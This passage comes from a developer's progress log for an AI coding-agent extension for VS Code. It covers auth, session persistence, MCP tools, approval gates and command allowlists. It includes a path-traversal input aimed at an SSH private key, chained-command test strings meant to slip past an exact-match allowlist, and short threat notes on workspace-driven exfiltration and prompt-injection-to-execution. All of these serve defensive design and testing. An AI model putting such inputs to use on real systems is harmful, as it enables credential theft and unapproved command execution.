  exactly as a tool path does — `@../../../.ssh/id_rsa` fails the same way.
- **`Conversation` now holds two views.** `toArray()` is the full record (persisted and
  rendered); `toModelMessages()` applies compaction. Compacting in place would save the same
  tokens but turn the stored transcript into a summary of the session rather than the
  session — which Phase 6b explicitly forbids.
- UI: `TokenBar` (proportional bar, expandable breakdown, cache hit rate), composer image
  attachment via button/paste/drop gated on the capability table, and `@` autocomplete
  backed by `vscode.workspace.findFiles` so `files.exclude` is honoured for free.
- 373 unit tests (up from 272).

**Prefix stability is now asserted in CI, not just watched.** The plan's Verify step was
"run a 40-turn session and watch the token bar; if cache hit rate collapses, something is
mutating the prefix". That is a good live check but slow and indirect, so
`agent/prefixStability.test.ts` asserts the property directly across **all three adapters**:
three turns with a growing conversation must produce a byte-identical tool block, and
Anthropic's `system` / Gemini's `systemInstruction` must not drift. Key *ordering* is
covered too — two deeply-equal objects that serialise differently defeat a prefix cache just
as thoroughly as different content.

**Not yet verified against live Anthropic or Gemini endpoints.** Both adapters are covered
by mock-stream tests built from the documented event shapes, and DeepSeek still works
through the OpenAI adapter, but neither new wire format has been exercised against the real
service. Watch specifically for: Anthropic's alternation rules on a long tool-heavy session,
and whether Gemini's function-call-name matching survives two calls to the same tool in one
turn.

**Plan changed 2026-08-09 — Phase 8b, vector stores and semantic retrieval.** User-requested:
OpenSearch, Qdrant, or Chroma, selectable per data type, defaulting to Qdrant for codebase
indexing and OpenSearch for skills and tool documentation. This **reverses three recorded
decisions** (§6, §12, §18), which is why the reasoning is written into each of those sections
rather than only into the plan. Three things to carry into that phase:
- **Retrieval is exposed as tools, never as dynamic tool definitions.** §12's objection was
  specifically that varying the front of the prompt per turn destroys the cache prefix, and
  that cost has not changed. `search_docs`/`search_codebase` return tool results instead.
- **`vectorStores`, `embedder`, `collections` are user-scope only** (invariant 5). A
  workspace that could set the embedder URL would exfiltrate your source code on open.
- Sequenced **after Phase 8 (release)** — nothing in v1 needs it.

**Phase 6b done — task history and session persistence:**
- `history/types.ts` — `Task` stores **only** the model-facing `ChatMessage[]`. What the UI
  renders is derived from it by `history/transcript.ts`, never stored alongside it: two
  saved views of one conversation would drift, which is the same reasoning as §15's
  single-schema rule. `TranscriptEntry` is now the shared shape, and `DisplayMessage` in
  the UI is defined as that type plus a `pending` flag, so a restored task renders through
  exactly the same path as a streaming one.
- `CONTROL_TOOLS` and `formatToolArguments` **moved from `bridge.ts` into core**, because
  the live transcript and a restored one have to agree about how a task looked.
- `history/titles.ts` — title from the first user message. Deliberately not model-generated:
  that costs a request per task, and what the user typed describes the intent better than a
  summary of what happened.
- `apps/vscode/src/platform/taskStore.ts` — one JSON file per task plus an `index.json`.
  **The index is a cache; the task files are the truth.** A missing or unparseable index is
  rebuilt by scanning rather than reported as "no history" — otherwise one corrupt write
  silently erases the whole list while the transcripts sit intact on disk. Writes go to a
  temp file and rename, so an interrupted write cannot replace a good transcript with a
  truncated one.
- Tasks live in **global** storage, not the workspace: a transcript is the user's, not the
  repository's, and `.lightcode/` is checked in. They are *listed* per workspace.
- `RecordingTruncationStore` wraps the spill store so a task knows which spilled results it
  owns; deleting a task deletes them. A wrapper rather than threading the handle back out
  through every tool's `ToolResult`.
- The active task id lives in `workspaceState`, so a reload reopens **the conversation that
  was in progress** rather than the most recent one — those differ as soon as the user
  reopens an older task.
- Saving happens in the turn's `finally`, so a cancelled or errored turn is still persisted.
  A turn that failed halfway is exactly the one worth seeing again.
- **`readFiles` is deliberately NOT restored** on resume. The read-before-edit constraint
  (§6) is session-scoped on purpose: a resumed task must re-read a file before editing it,
  because the file may have changed since the transcript was written. Restoring the set
  would quietly weaken the invariant across a restart — precisely when the model's picture
  of the workspace is most likely to be stale.
- 272 unit tests (up from 223).

**A real hole found by the plan's own "grep the stored files for secrets" step:** the
transcript was redacted but **the spilled tool-result files were not**, and those are the
larger target — whole-file reads and raw command output, written by `truncateToolResult`
since Phase 3 and, before this phase, never cleaned up at all. Redaction now happens inside
`DiskTruncationStore.save()`, at the boundary where content actually reaches disk, with
known secret values supplied by the bridge and refreshed *before* each turn (the spill
happens during the turn, so populating them only at save time would leave the first turn's
output in the clear). Verified by grepping `tool-results/` as well as `tasks/`.

Accepted consequence, stated so it is not treated as a bug later: **resuming a task feeds
the model the redacted text**, not the original. Losing a value the model should not have
been shown twice is the better failure.

**Verified end to end against real files on disk** (19/19): a session with a tool call and a
spilled result saves, reloads, and renders identically; `attempt_completion` still renders
as assistant text rather than a collapsed block; resuming keeps the *current* system prompt
rather than the stored one; deletion removes the transcript, the index entry, and the
spilled output; a deleted index rebuilds from the task files; and neither the API key nor a
Bearer token appears anywhere under `tasks/` or `tool-results/`.

**Still to verify manually in a real Extension Host:** the restart-survival path itself
(close the sidebar, reload the window, restart VS Code), the history list UI, and reopening
a task then being refused an edit until the file is re-read.

**Phase 6 done — Apigee mTLS auth, model dropdown, Test Connection:**
- `platform/http.ts` now uses **undici**, not global `fetch`. Node's built-in fetch has no
  supported way to present a client certificate, so mTLS was impossible without this.
  `HttpRequestOptions.tls` carries the material; agents are pooled per material so
  connection reuse survives.
- `providers/auth/certs.ts` — PEM and PFX, `notAfter`, expiry warnings at 30/7 days and
  after expiry, and a real key/cert match check (sign a probe with the key, verify with the
  cert's public key). Tested against **genuine OpenSSL-generated X.509**, not fixtures.
  PFX deliberately reports no `notAfter`: Node only validates a PFX at handshake time, and
  absent is honest where a guessed date would not be.
- `providers/auth/apigeeMtls.ts` — client-credentials over mTLS. Token in memory only, with
  no getter: the only way it leaves the class is inside a request header. Proactive refresh
  at `issuedAt + expiresIn - skew`, single-flight via a shared in-flight promise, exactly
  one 401 retry, and `ensureTokenForStream()` (120s margin) so a token cannot expire
  mid-generation.
- `providers/auth/factory.ts` — builds a strategy from config. Secrets are resolved **per
  request** through a callback rather than captured at construction, so rotating one in
  storage takes effect on the next refresh (§15).
- `platform/tls.ts` — CA merging. Lives beside `http.ts` rather than under `providers/auth`
  as the plan sketched, because `platform` importing `providers` would invert the layering.
- `providers/models.ts` — `/models` fetch that **never throws** (a warning plus an empty
  list; the dropdown is never a hard dependency) and a local capability table matched by
  substring, longest key first, so gateway aliases like `corp-openai-gpt-4o-v2` resolve.
  Unknown ids default to 32k / no vision, deliberately conservative.
- `providers/testConnection.ts` — load-certs → get-token → list-models, reporting which
  step failed and skipping the rest.
- UI: `ModelSelect` (dropdown *and* free text, always both), `TestConnectionPanel`,
  `AdvancedAuthSection`. Selecting `apigeeMtls` removes the API key field entirely.
- 223 unit tests pass (1 skipped: the symlink case, still needing symlink privilege).

> **CONFIRMED AGAINST A REAL APIGEE GATEWAY (2026-08-11).** The user reports the mTLS +
> client-credentials path working in their corporate environment. This closes the gap the
> paragraph below describes — the design is no longer inferred from a substitute, it is
> known to work end to end against a production gateway.
>
> Worth remembering *why* it worked first time: every gateway-specific field (`tokenUrl`,
> `tokenPath`, `expiresInPath`, `tokenHeaderName`, `tokenHeaderPrefix`,
> `fallbackExpirySeconds`) was made configurable with a working default rather than
> hardcoded, precisely because nobody could test the real thing. The defaults held.
>
> Still unconfirmed over a long session: proactive refresh at the skew boundary and the
> single 401 retry, both of which only fire after the first token expires.

**Originally verified without an Apigee gateway.** At the time there was no Apigee setup, so
the whole path was driven against a **local HTTPS server that genuinely requires a client
certificate** (`requestCert: true, rejectUnauthorized: true`, CA/server/client certs minted
with OpenSSL): real undici TLS stack, real handshake, real grant, real trust failures.
14/14 checks pass — the server confirms it saw `CN=lc-test-client`, the issued token reaches
the inference request, a mismatched key is rejected before any network call, and an
untrusted CA produces a sentence naming the fix. **Was unverified until 2026-08-11:** this particular
gateway's own quirks (its token path, header name, expiry semantics) — all configurable,
all defaulted.

**That live test found two bugs the mocks could not. Both are worth remembering:**
- **undici hides every transport failure behind `TypeError: fetch failed`,** with the real
  reason on `.cause` (sometimes nested twice). `describeTlsError` read only the top-level
  message, so the single most likely corporate failure — an untrusted intercepting root —
  surfaced as "fetch failed", which is precisely what §10 forbids. It now walks the cause
  chain (depth-capped; a self-referential `cause` is real). Regression tests cover it.
- **The bridge rebuilt the auth strategy every turn,** which meant the token cache, the
  proactive refresh and the single-flight guard could never engage — every user message
  would have triggered a fresh handshake and a new grant. The strategy is now cached and
  keyed on profile id + auth block + certDir, and dropped explicitly on profile save (the
  key cannot see a *rotated* secret, since the ref is unchanged).

**Also worth knowing before Phase 6b:**
- **Passing `ca` to Node/undici replaces the bundled Mozilla root store rather than adding
  to it.** A user supplying a corporate root to make their gateway work would silently lose
  every public CA, and the symptom would appear against an unrelated host much later.
  `platform/tls.ts` merges `tls.rootCertificates` + `NODE_EXTRA_CA_CERTS` + configured CA.
  `NODE_EXTRA_CA_CERTS` needs re-reading explicitly: Node folds it into the *default* store
  at startup, which an explicit `ca` bypasses entirely, so setting it would otherwise
  appear to do nothing.
- **The TLS agent cache was keyed on byte lengths** and is now keyed on a content hash. A
  renewed certificate is overwhelmingly likely to be the same length as the one it replaces
  (same key size, issuer, subject), so the old key would have kept serving the retired
  certificate until the extension host restarted — defeating the rotation support it was
  written to provide.
- Invariant 4's "CI fails if built output contains an absolute external URL" check **does
  not exist yet**; `.github/workflows/ci.yml` runs only lint/typecheck/build/test. Note that
  the webview bundle now legitimately contains example URLs as form placeholders, so that
  check will need to distinguish a placeholder from a fetch target when it is written.

**Manual verification is now a checked-in procedure: `MANUAL_VERIFICATION.md`,** with a
fixture-workspace generator at `scripts/make-verification-workspace.mjs`. It is ordered by
consequence rather than by phase — Session A is the security properties, where "it looked
fine" is not evidence, and the sharpest single check is that **"Always allow" on
`node --version` must NOT allow `node --version && echo hi`**. Work through it before any
release; record findings back into this section.

**One item is already partly confirmed.** Inspecting global storage on 2026-08-09 found a
task written by a real Extension Host run — correct shape, title derived from the first user
message, system prompt excluded from the count, matching index entry. Phase 6b's *write*
path therefore works outside tests; the restore paths are still unproven.

**Phase 5 done — MCP client:**
- `mcp/types.ts` — the standard `mcpServers` shape, with transport **inferred** from the
  entry (`command` → stdio, `url` → HTTP) rather than declared. Requiring an explicit
  `type` would break the "paste a config from another client unchanged" requirement,
  which has a test using a verbatim third-party-shaped config.
- `mcp/client.ts` — thin SDK wrapper. Secrets are `${secret:NAME}` references resolved
  from `SecretStore` **at spawn time**, never written to config (§15); an unresolvable
  reference throws rather than passing the literal placeholder to the server.
- `mcp/registry.ts` — lazy connect, per-server health, restart, `tools/list_changed`
  refresh, and per-server / per-tool toggles. **A disabled server or tool contributes no
  tools at all**, so it never reaches the system prompt — the same rule as mode filtering,
  not a refusal at call time. One server failing is isolated: state is per-server.
- **MCP tools are adapted into the ordinary `Tool` interface.** That is the design choice
  that matters: the agent loop, the approval gate, and mode filtering treat an MCP tool
  exactly like `execute_command`, with no special-casing anywhere upstream. An MCP tool
  call is approval-gated for free.
- `Tool.rawJsonSchema` added: an MCP server's own JSON Schema is passed through
  **untouched** rather than round-tripped through zod, which would silently drop keywords.
  §11 names schema translation as a silent-failure source, so the safe move is not to
  translate. Local `parametersSchema` is permissive; the server validates authoritatively.
- Package-runner commands (`npx`, `uvx`, `pnpm` …) produce the §3 warning in the MCP tab.
- `McpTab` — expandable server list with a per-server enable toggle, each server's tools
  listed individually with a **three-state control (Always / Ask / Never)**, plus health,
  restart, and a collapsed raw JSON editor validated against the same schema the file
  loader uses (accepting either the `{"mcpServers":{...}}` wrapper or the bare map, since
  both get pasted).
- **Per-tool permission is composed from the two stores that already existed**, not a
  third: `never` is the server's `disabledTools`, `always` is the workspace's
  `allowedTools`, `ask` is neither. `resolveToolPermission()` is a pure function so the
  precedence is testable — and **`never` beats `always`**, so a stale allow-entry can
  never resurrect a tool the user hid. Setting one state clears the other.
- Connections are closed on dispose — stdio servers are child processes, and not closing
  them leaks one per panel open.
- **`stderr: 'pipe'` must always be drained.** Setting it without attaching a reader
  discards the server's diagnostics *and* fills the ~64KB OS pipe buffer, after which the
  child blocks on its next write — presenting as a server that hangs partway through
  work. `McpConnection` attaches the reader *before* `connect()` so startup output is
  captured too; lines go to a bounded per-server buffer surfaced in the MCP tab.
- **Lazy connect is about startup cost, not about withholding feedback.** Applied too
  literally at first: a server sat at `idle` with no way to learn whether its command was
  even valid until something happened to use it. Enabled servers now connect when the
  panel opens (§11, revised), plus an explicit **Connect** action and verify-on-save.
  Nothing spawns at VS Code startup — the extension only activates once the view is
  revealed.
- 132 unit tests (up from 107).
- **`mcpServers` is deliberately NOT on invariant 5's user-scope-only list**, unlike
  `approvals`. A workspace-supplied server cannot bypass approval, because every MCP tool
  call is gated like any other. Reconsider only if that ever stops being true.
- **Not yet manually verified** — needs a real MCP server to exercise.

**Phase 4 done — modes, tool groups, Approvals tab:**
- `modes/` — `Code` (all groups) and `Ask` (read + mcp + always). **Filtering happens
  before tool definitions are built**, so an excluded tool never enters the system prompt;
  the model is not told it exists. The loop *also* rejects an out-of-mode tool call as
  defence in depth, because after a mid-session switch the history still references tools
  that are no longer offered.
- `approval/policy.ts` — `PolicyApprovalGate` **wraps** the user-facing gate rather than
  teaching the loop about policy: it answers what it can from settings and delegates the
  rest. The loop's single responsibility ("ask before acting") stays intact.
- `approval/commands.ts` — exact-match allowlist, `Array.includes` and nothing else. The
  test table is the specification: `npm test && echo hi`, `npm  test` (double space),
  ` npm test`, and `NPM TEST` must all still prompt when `npm test` is allowed.
- **`execute_command` is deliberately stricter than its category.** A command is
  auto-approved if it is on the exact allowlist *or* the category toggle is on — because
  "auto-approve the commands I listed" and "auto-approve all commands" are very different
  grants, and only the latter should require the blunt toggle.
- The allowlist is checked against **the tool's own preview**, not the model's arguments —
  same ground-truth principle as invariant 8, applied to the policy decision.
- UI: `ApprovalsTab` (category toggles + revocable allowlists), `ModeSelector` in the chat
  header (disabled mid-turn), and `SettingsPanel` is now a real tabbed shell.
- Mode is resolved **once per turn**, not per tool call, so tool definitions stay
  byte-stable for the whole loop and the prompt-cache prefix survives (§12).
- 107 unit tests (up from 80).

**Invariant 5 extended in Phase 4 — this was a real hole.** `approvals` is now
user-scope-only. The spec said "always allow" is *scoped* per workspace but never said
where it is *stored*; storing it in `.lightcode/config.json` would have let any repo you
clone ship its own pre-approvals and run shell commands the moment you opened it — worse
than the hole invariant 5 already closed. Approvals are keyed by workspace path inside
user config instead. `scopes.test.ts` has a test named for the attack. **Scope and storage
location are separate decisions; do not collapse them.**

**Also unified in Phase 4:** `WorkspaceApprovals`/`AutoApproveSettings` are now inferred
from the zod schema rather than hand-written alongside it — the two had already drifted
(`exactOptionalPropertyTypes` caught it), which is exactly the drift §15's
single-schema rule exists to prevent. `ApprovableGroup` is `Exclude<ToolGroup, 'always'>`,
so control tools cannot be added to an auto-approve list even by mistake.

**Phase 3 (second half) done — approval and checkpoints:**
- **The gate lives in the loop, not the UI.** `runOneToolCall()` in `agent/loop.ts` is the
  single path from "the model asked" to "it happened": validate → checkpoint → approve →
  execute. Ordering is load-bearing — validation precedes approval so the preview shows
  *real* parameters, and the checkpoint precedes execution so a rollback point exists.
- **`ToolPreview` is how invariant 8 is expressed as a type.** A tool computes its own
  ground truth (`{kind:'diff'}` / `{kind:'command'}` / `{kind:'text'}`); the prompt renders
  only that, never model prose. `apply_diff.preview()` runs the *real* matching cascade
  without writing, so the approved diff is byte-for-byte what `execute()` will produce
  rather than a re-derivation that could drift from it.
- **Denial is a tool result, not an abort.** The model is told "the user denied permission"
  and gets another turn to try something else, instead of the conversation just stopping.
- **A failed checkpoint blocks the edit.** Editing anyway would leave the user believing
  they can roll back when they cannot — worse than not editing.
- **A throwing `preview()` never becomes implicit approval** — it degrades to a text
  preview explaining the failure, and the user is still asked.
- `checkpoints/shadowGit.ts` uses a **separate `--git-dir` with the workspace as work
  tree**, so the user's own repo — index, branches, stash, history — is never touched.
  Snapshot is once per task (before the first edit), not per edit. `restore()` also runs
  `clean -fd`, since leaving files created after the snapshot would produce a state that
  never existed. Missing `git` degrades to "no checkpoints" with a logged warning rather
  than breaking the session.
- Rollback clears `readFiles` and tells the model the workspace was reverted — otherwise
  it would keep editing against content that no longer exists.
- `WebviewApprovalGate` parks a promise per request id; `denyAll()` on cancel/dispose so a
  turn can never be left waiting on an answer that will never arrive. **Deny is the safe
  direction for every abandoned request.**
- UI: `approval/ApprovalPrompt.tsx`, `approval/DiffView.tsx`, and a dependency-free
  line-level LCS differ (`approval/diff.ts`) with collapsed unchanged context. Written
  rather than pulled in, because this is what the user relies on to judge whether an edit
  is safe.
- 80 unit tests (up from 69). The 11 new ones assert the security properties directly:
  denial blocks execution, denial still feeds back, control tools are never gated, read
  tools *are* gated, the computed preview reaches the gate, a failed checkpoint blocks the
  edit, and snapshots happen once per task.
- **Not yet manually verified** — automated checks are green, but the prompt, diff,
  denial, and rollback have not been exercised against a live session.

**Decision revised during Phase 3:** command "always allow" is **exact-match on every
platform**, replacing "no command auto-approve on Windows" (§8, §18). The hazard was never
Windows itself — it was that *pattern* matching requires tokenising PowerShell correctly,
and a parsing bug silently auto-approves a chained destructive command. Byte-for-byte
comparison needs no parser, so both the hazard and the platform carve-out disappear
(Phase 4's `windows.ts` is no longer needed). **Do not widen this to prefix/glob matching.**

**Phase 3 (first half) done:**
- **Tool-calling in the provider layer.** `OpenAIProvider` now sends `tools`/`tool_choice`
  and parses streamed `tool_calls` deltas (arguments arrive fragmented across chunks and
  are accumulated by index until `finish_reason: "tool_calls"`). `ChatMessage` became a
  discriminated union so `assistant` can carry `toolCalls` and `tool` can carry a
  `toolCallId`; `toWireMessage` maps that to OpenAI's shape.
- **Nine tools** in `packages/core/src/tools/`: `read_file`, `list_files`, `search_files`
  (the last two ripgrep-backed), `write_to_file`, `apply_diff`, `execute_command`,
  `ask_followup_question`, `attempt_completion`, plus `read_tool_result`. Every path-taking
  tool goes through `resolveToolPath()` → `confine()` + `PathDenylist` (invariants 5, 6).
- **`apply_diff`** — the four-tier cascade per §7 (exact → whitespace-insensitive → anchor
  for 5+ line blocks → fail with surrounding context). No fuzzy scoring. All blocks
  validated before any write; applied bottom-up so earlier edits don't shift later ones.
- **The read-before-edit constraint** (§6) is enforced via a session-scoped `readFiles` set
  that only `read_file` populates.
- **`runAgentTurn` is now a real loop**: one tool call per assistant message, result fed
  back as the next turn, terminating on `attempt_completion`/`ask_followup_question`, a
  plain text answer, the iteration cap (default 25), or 3 consecutive failures on the same
  file.
- **Result truncation** (§12) — `agent/truncate.ts` caps oversized results (~8k chars),
  spills the full output to disk, and returns a handle `read_tool_result` can re-read with
  an offset. Built now precisely because retrofitting it would change every tool's return
  path.
- 69 unit tests (up from 42), including the full `apply_diff` cascade: CRLF file,
  whitespace-only mismatch, 6-line anchor match, non-unique rejection, malformed block
  rejection, and all-or-nothing multi-block application.
- **Manually verified** against a live DeepSeek endpoint: a multi-step run
  (`list_files` → `attempt_completion`) executes and renders correctly.

**Surprised us in Phase 3:**
- **`@vscode/ripgrep` cannot be bundled by esbuild.** It resolves its binary via
  `createRequire(import.meta.url)`, and esbuild stubs `import.meta` to `{}` in CJS output —
  so `rgPath` resolution throws at runtime the first time any search runs. Typecheck and
  build both pass; only executing it fails. Fixed by marking it `external` in
  `esbuild.mjs` and adding it as a direct dependency of `apps/vscode` so it resolves from
  `node_modules` at runtime. **Watch for this with any dependency that locates a binary
  on disk.**
- **Three dangling-secret bugs**, surfaced by a user report of "the API key vanished".
  Direct inspection of `state.vscdb` vs its backup confirmed the secret genuinely
  disappeared between sessions while config still referenced it. The mechanism was never
  proven, but three real bugs let that state exist *and persist*: `duplicateProfile`
  claimed `apiKey` auth even when the source secret was missing; `saveProfile` preserved
  an `apiKeyRef` based on config's claim without checking the store (this is what made it
  unrecoverable — every save re-blessed the broken pointer); and `toSummary` derived
  `hasApiKey` from config, so Settings showed "Set — leave blank to keep" for a key that
  wasn't there. All three now treat the secret store as the source of truth. Import also
  reconciles now, since exports deliberately carry no secrets.
  **General lesson: config and the secret store are two stores that can diverge; never let
  one assert what only the other knows.**
- Added **secret audit logging** (`VSCodeSecretStore` + `context.secrets.onDidChange`) so a
  future disappearance is diagnosable rather than inferred. Key names only, never values.
- **`WebviewView` is destroyed whenever the view is hidden.** Switching to Explorer and
  back silently discarded the entire transcript. Fixed with
  `registerWebviewViewProvider(..., { webviewOptions: { retainContextWhenHidden: true } })`
  — note this is an option on the *provider registration*, not on `webview.options` where
  the other webview settings live. Survives view switches, not a window reload; that's
  Phase 6b.
- **Control tools should not render as tool blocks.** `attempt_completion` and
  `ask_followup_question` carry the model's actual message to the user, so showing them as
  collapsed "tool ran → done" blocks buried the answer behind a click. They now post as
  ordinary assistant text. Worth remembering when the approval UI lands: these two are
  never approval-worthy either — they perform no work.

**Plan changed during Phase 3** — three additions to `IMPLEMENTATION_PLAN.md`, all
user-requested mid-phase:

1. **Phase 6b — Task history and session persistence.** Nothing in the original plan
   persisted conversations; the transcript lives only in memory in `bridge.ts` and dies
   with the webview. An omission rather than a deliberate exclusion (absent from §18's
   do-not-build list, and Roo has task history). Sequenced before Phase 7 because
   compaction rewrites how history is assembled — building it after means touching the
   same code twice.
2. **Browser/Chrome access: raised, considered, and left excluded.** Browser automation is
   on the do-not-build list in three places. Shipping a Chrome DevTools MCP server (either
   bundled or as an `npx` preset) was drafted and then dropped — a user who wants browser
   control configures that MCP server themselves once Phase 5 exists, and Light Code needs
   no special support for it. Nothing changed in the plan; recorded only so the question
   isn't re-opened from scratch a third time.
3. **Phase 9b — Scheduled prompts and background sessions,** with a `notify` toast tool.
   Placed after release: it depends on Phase 4 (modes) and Phase 6b (sessions), isn't
   needed for v1, and is the second-sharpest security surface after Python tools.
   **The design problem is approval:** §8 assumes a human is present per invocation, and a
   schedule removes that assumption. Resolved with a *restricted autonomous mode* built on
   Phase 4's modes mechanism — read-only by default, widening is per-schedule and warned
   about, never a global auto-approve. Called out explicitly in the plan: browser/MCP
   access + unattended execution + edit/command tools is a direct prompt-injection →
   code-execution path, and must never be the default.

**Phase 2b done:**
- Full multi-profile CRUD replaces the single-`'default'`-profile draft from Phase 2:
  `packages/ui/src/settings/` — `SettingsPanel.tsx` (tabbed shell, one tab so far),
  `ProvidersTab.tsx` (list, Use/Edit/Duplicate/Delete, Export/Import buttons),
  `ProviderForm.tsx` (preset dropdown + fields + inline field-level errors),
  `ScopeBadge.tsx`, `SecretField.tsx` (write-only "Set — Replace?").
  `packages/core/src/providers/presets.ts` (OpenAI/DeepSeek/Custom, prefilling
  base URL + wire format, all fields still editable per §9).
  `packages/core/src/config/validate.ts` derives field-level validation from
  `providerProfileSchema.pick(...)` — the exact same schema the file loader uses, so a
  bad UI save and a bad hand-edit fail identically. `baseUrl` now validates as a real
  URL (`.url()`), not just non-empty — a deliberate strengthening of invariant-adjacent
  validation, shared by both paths since it lives in the one schema.
- `bridge.ts` handles `requestProfiles`/`saveProfile`/`duplicateProfile`/
  `deleteProfile`/`setActiveProfile`/`exportConfig`/`importConfig`. Duplicate copies the
  actual secret value to a new `SecretStorage` key (not just the reference) so the copy
  works standalone; delete removes the profile's secret too, not just the config entry.
  Export/import go through `vscode.window.showSaveDialog`/`showOpenDialog` — config
  export is safe by construction, not by redaction: the file format only ever stores
  `apiKeyRef` pointers, never key values, so there's nothing to strip.
- Fresh-install CTA: `App.tsx` requests the profile list on mount (not just when
  Settings opens) and shows "No provider configured yet" instead of a blank chat when
  the list is empty.
- Verified per the phase's own Verify step: grepped `HostToUiMessage` — no variant
  carries a secret value, only `hasApiKey: boolean` per profile. The one `secrets.get()`
  call in the codebase (inside `duplicateProfile`, to copy the value) never reaches a
  `post()` call.
- 42 unit tests total (up from 36): presets and `validateProviderForm`.

**Surprised us in Phase 2b:**
- **The webview bundle broke** the moment `ProviderForm.tsx` imported a real value
  (`providerPresets`, `validateProviderForm`) from `@light-code/core` rather than only
  types. Type-only imports get erased by TypeScript, so they were free; a value import
  pulls in core's whole barrel file, which transitively reaches `node:fs`/`node:path`
  (via `ConfigManager`, `confine()`, `env-paths`, etc.) — and esbuild's tree-shaking
  through a multi-layer barrel wasn't reliable enough to strip those back out even
  with `"sideEffects": false` set. Fixed properly, not papered over: added
  `packages/core/src/browser.ts`, a second entry point (`@light-code/core/browser` via
  `package.json` `exports`) containing only what's genuinely safe for a browser bundle
  — protocol types, `Transport`, provider/preset types, `providerPresets`,
  `validateProviderForm`. **packages/ui must only ever import from `@light-code/core/browser`,
  never the bare package** — if a future value export needs to reach the UI, it goes
  through this file deliberately, not by accident. Worth remembering before Phase 3
  adds more shared value-level exports (tool result types, etc.) that `packages/ui`
  might want to import.
- A live DeepSeek response claiming "I'm a chat model" while `deepseek-reasoner` was
  correctly selected (confirmed via the request log AND the presence of
  `reasoning_content` deltas, which only the reasoner model emits) turned out to be the
  model being wrong about its own identity — not a profile-routing bug. Worth
  remembering as a category: LLMs are unreliable narrators of which model/version they
  are, and that alone isn't evidence of a client-side bug. `reasoning_content` deltas
  are correctly ignored (not displayed) by the current adapter — showing a reasoning
  trace in the UI is a future enhancement, not a gap.

**Phase 2 done, plus deliberate scope changes from the plan as written:**
- `packages/core/src/providers/`: `types.ts` (zod schemas + inferred types for
  `WireFormat`, `Auth`, `ProviderProfile`, plus `ChatMessage`/`StreamChunk`/`ChatProvider`),
  `openai.ts` (SSE-streaming OpenAI-compatible adapter over `HttpClient`), `registry.ts`
  (`resolveActiveProfile`), `auth/apiKey.ts` (`apiKey`/`none` strategies). `agent/`:
  `messages.ts` (`Conversation`), `loop.ts` (`runAgentTurn` — minimal, no tools),
  `protocol.ts` (`UiToHostMessage`/`HostToUiMessage`, shared by ui and vscode).
- **Config schema changed from Phase 1's assumption.** Invariant 5 originally named
  `provider.baseUrl` + `auth` (a single active profile). Implementing named profiles
  (§9) properly required `profiles: ProviderProfile[]` + `activeProfileId`, and the
  right security boundary is the **whole list** being user-scope-only — a workspace
  injecting a brand-new profile is exactly invariant 5's threat, not just editing an
  existing one's `baseUrl`/`auth`. Invariant 5's wording was updated to match, in the
  same commit as the schema change. `USER_SCOPE_ONLY_KEYS` is now
  `['profiles', 'activeProfileId', 'certDir', 'python.uvPath']`.
- **The webview is a sidebar `WebviewView` (Activity Bar icon), not a command-opened
  `WebviewPanel`** — changed from the original plan based on direct user feedback
  mid-phase. `apps/vscode/src/webview/chatViewProvider.ts` replaces the old `panel.ts`;
  `contributes.viewsContainers`/`views` in `apps/vscode/package.json`. `bridge.ts` now
  takes a plain `vscode.Webview`, not a `WebviewPanel`, so it works for either host.
- **A minimal single-profile settings screen was pulled forward from Phase 2b**, also
  from mid-phase user feedback (nobody should have to use `showInputBox` prompts to
  configure a provider). `packages/ui/src/Settings.tsx` + a gear-icon toggle in
  `App.tsx`; host side handled `requestProfile`/`saveProfile` in `bridge.ts` against a
  single hardcoded `'default'` profile ID. **Fully replaced by the real Phase 2b work
  below** — `Settings.tsx` no longer exists; see the Phase 2b entry.
- Icons: `apps/vscode/resources/` holds real brand assets (activity-bar-icon.svg,
  icon-256.png for the marketplace listing, etc.) supplied by the user, replacing the
  placeholder chat-bubble glyph from initial scaffolding. `packages/ui/src/icons.tsx`
  has small inline SVG icons (send/stop/back/settings) — no icon font/library, keeps
  the bundle small and the CSP unloosened.
- Styling uses VS Code's `--vscode-*` theme CSS variables (`packages/ui/src/theme.ts`)
  exclusively, via React's `style` prop (CSSOM property assignment — not subject to
  `style-src` CSP at all, so the webview CSP stays `default-src 'none'` with no
  `style-src` exception needed). This is deliberate: it makes the UI track whatever
  theme the user has active rather than a fixed palette.
- 36 unit tests total (up from 18): SSE parsing (split-chunk buffering, malformed
  frames, HTTP errors, network errors, clean abort), auth strategies, profile
  resolution, and the agent loop (including the two bugs below).
- Manual end-to-end verification against a real DeepSeek endpoint: streaming works,
  cancellation works, a deliberately-wrong base URL produces a readable error.

**Two real bugs found and fixed during manual testing (not caught by unit tests —
worth having caught in Phase 3+'s test strategy for the UI side):**
1. **Late-error text loss.** If a stream errored *after* sending some text (e.g. a
   connection drop near the end of a long response), both `runAgentTurn` and the UI
   discarded everything already received instead of keeping it. Fixed in both places:
   `runAgentTurn` now calls `conversation.addAssistantMessage` before `onError` if any
   text arrived; the UI does the equivalent for its own state.
2. **The actual root cause of "response streams in, then vanishes to an empty bubble":**
   `App.tsx` kept the in-progress assistant reply in *separate* state
   (`streamingText`/a ref) from the finalized `messages` array, manually handed off at
   the `done`/`error` boundary. This is exactly the shape of bug that's easy to get
   wrong and hard to fully rule out by inspection — fixed by removing the separate
   state entirely: the in-progress message now lives *inside* `messages` (a `pending`
   flag), updated in place. No hand-off moment means no seam for this class of bug to
   hide in. Also made `HostToUiMessage`'s `textChunk` carry the *full* accumulated
   text rather than a delta, since `webview.postMessage` delivery isn't guaranteed
   (confirmed via `Thenable<boolean>` — false means undelivered) and cumulative
   messages are self-correcting if one is ever dropped. `WebviewTransport` now logs a
   warning (via the `Light Code` Output channel) if delivery ever reports failure.
3. **Separately, a `Settings.tsx` race condition** looked like "the API key isn't
   persisting" but wasn't a persistence bug at all: `useState(props.baseUrl)` only
   applies its argument once, at mount. `openSettings()` fires `requestProfile` and
   switches views in the same synchronous call, so `Settings` can mount *before* the
   host's response arrives — whichever happens to win that race determined whether the
   fields showed real data or stayed empty forever after. Fixed with a `useEffect`
   that resyncs local state whenever the `baseUrl`/`model` props change. Confirmed via
   direct inspection (both the config file on disk and the encrypted secret in VS
   Code's `state.vscdb`) that the underlying data was correct the whole time — this
   was purely a rendering bug, and a good reminder not to trust "it looks unpersisted"
   reports at face value without checking storage directly.

**Phase 1 done:**
- All six platform interfaces defined in `packages/core/src/platform/`
  (`FileSystem`, `Terminal`, `SecretStore`, `ConfigStore`, `Transport`, `HttpClient`).
  `HttpClient` is the one with a real implementation in core (`FetchHttpClient`, using
  global `fetch`) — the other five are interfaces only, implemented in
